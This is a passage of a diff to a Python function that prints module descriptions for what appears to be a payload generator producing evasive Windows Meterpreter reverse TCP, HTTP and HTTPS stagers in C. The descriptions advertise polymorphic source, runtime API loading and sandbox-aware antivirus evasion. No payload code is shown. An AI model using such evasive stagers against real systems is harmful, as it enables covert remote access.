+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_tcp\n\n"
+
+        else:
+            description += "  32bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] TYPE: TCP \n "
         description += "  [>] STATIC EVASION:\n"
         description += "  Polymorphic source code \n"
         description += "  [>] DYNAMIC EVASION:\n"
@@ -2352,14 +2706,56 @@ def description_printer(module_type):
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-
-    elif module_type == "Polymorphic_C_x86ReverseHttpMeterpreter_windows.py":
+    elif (module_type == "x86ReverseTcpMeterpreter_virtualNDC_C_windows.py") or (module_type == "x64ReverseTcpMeterpreter_virtualNDC_C_windows.py"):
 
         description = ""
         description += "  This Module generate and compile\n"
-        description += "  32bit pure c meterpreter reverse http stagers. \n"
-        description += "  Require msfconsole multi/handler listener\n"
-        description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_tcp\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] TYPE: TCP \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  API loaded at runtime   \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseTcpMeterpreter_heap_C_windows.py") or (module_type == "x64ReverseTcpMeterpreter_heap_C_windows.py"):
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_tcp\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] TYPE: TCP \n"
         description += "  [>] STATIC EVASION:\n"
         description += "  Polymorphic source code \n"
         description += "  [>] DYNAMIC EVASION:\n"
@@ -2367,13 +2763,88 @@ def description_printer(module_type):
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-    elif module_type == "Polymorphic_C_x64ReverseTcpMeterpreter_windows.py":
+    elif (module_type == "x86ReverseTcpMeterpreter_heapNDC_C_windows.py") or (module_type == "x64ReverseTcpMeterpreter_heapNDC_C_windows.py") :
 
         description = ""
         description += "  This Module generate and compile\n"
-        description += "  64bit pure c meterpreter reverse tcp stagers. \n"
-        description += "  Require msfconsole multi/handler listener\n"
-        description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_tcp\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse tcp stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] TYPE: TCP \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  API loaded at runtime   \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif (module_type == "x86ReverseHttpMeterpreter_virtual_C_windows.py") or (module_type == "x64ReverseHttpMeterpreter_virtual_C_windows.py") :
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse http stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_http\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse http stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] TYPE: HTTP \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  API loaded at runtime   \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseHttpMeterpreter_virtualNDC_C_windows.py") or (module_type == "x64ReverseHttpMeterpreter_virtualNDC_C_windows.py") :
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse http stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_http\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse http stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] TYPE: HTTP \n"
         description += "  [>] STATIC EVASION:\n"
         description += "  Polymorphic source code \n"
         description += "  [>] DYNAMIC EVASION:\n"
@@ -2381,14 +2852,170 @@ def description_printer(module_type):
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-
-    elif module_type == "Polymorphic_C_x64ReverseHttpMeterpreter_windows.py":
+    elif (module_type == "x86ReverseHttpMeterpreter_heap_C_windows.py") or (module_type == "x64ReverseHttpMeterpreter_heap_C_windows.py"):
 
         description = ""
         description += "  This Module generate and compile\n"
-        description += "  64bit pure c meterpreter reverse http stagers. \n"
-        description += "  Require msfconsole multi/handler listener\n"
-        description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse http stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_http\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse http stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] TYPE: HTTP \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  API loaded at runtime   \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseHttpMeterpreter_heapNDC_C_windows.py") or (module_type == "x86ReverseHttpMeterpreter_heapNDC_C_windows.py"):
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse http stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_http\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse http stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] TYPE: HTTP \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseHttpsMeterpreter_virtual_C_windows.py") or (module_type == "x64ReverseHttpsMeterpreter_virtual_C_windows.py"):
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse https stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_https\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse https stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_https\n\n"
+
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] TYPE: HTTPS \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  API loaded at runtime   \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseHttpsMeterpreter_virtualNDC_C_windows.py") or (module_type == "x64ReverseHttpsMeterpreter_virtualNDC_C_windows.py"):
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse https stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_https\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse https stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_https\n\n"
+
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] TYPE: HTTPS \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseHttpsMeterpreter_heap_C_windows.py") or (module_type == "x64ReverseHttpsMeterpreter_heap_C_windows.py") :
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse https stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_https\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse https stagers. \n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_https\n\n"
+
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] TYPE: HTTPS \n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  API loaded at runtime   \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif (module_type == "x86ReverseHttpsMeterpreter_heapNDC_C_windows.py") or (module_type == "x64ReverseHttpsMeterpreter_heapNDC_C_windows.py"):
+
+        description = ""
+        description += "  This Module generate and compile\n"
+
+        if "x64" in module_type:
+
+            description += "  64bit pure c meterpreter reverse https stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/x64/meterpreter/reverse_https\n\n"
+
+        else:
+
+            description += "  32bit pure c meterpreter reverse https stagers. \n"
+            description += "  Windows API loaded at runtime with GetProcAddress() \n"
+            description += "  and GetModuleHandle().\n"
+            description += "  Require msfconsole multi/handler listener\n"
+            description += "  with payload set to windows/meterpreter/reverse_https\n\n"
+
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] TYPE: HTTPS \n"
         description += "  [>] STATIC EVASION:\n"
         description += "  Polymorphic source code \n"
         description += "  [>] DYNAMIC EVASION:\n"
